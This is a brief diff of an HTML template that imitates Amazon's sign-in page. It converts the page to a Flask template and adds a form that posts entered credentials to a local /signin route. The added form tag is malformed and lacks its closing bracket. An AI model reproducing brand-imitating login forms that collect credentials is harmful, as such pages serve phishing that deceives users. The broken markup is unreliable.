@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign In</title>
-    <link rel="stylesheet"  href="signin.css">
+    <link rel="stylesheet" href="{{url_for('static',filename='css/signin.css' )}}">
 </head>
 <body>
     <div id="SignInBorder">
         <p id="SignInTxt">Sign in</p>
+        <form method="post" action="/signin"
         <label>
             <strong>Email (Phone for mobile accounts)</strong>
             <br>
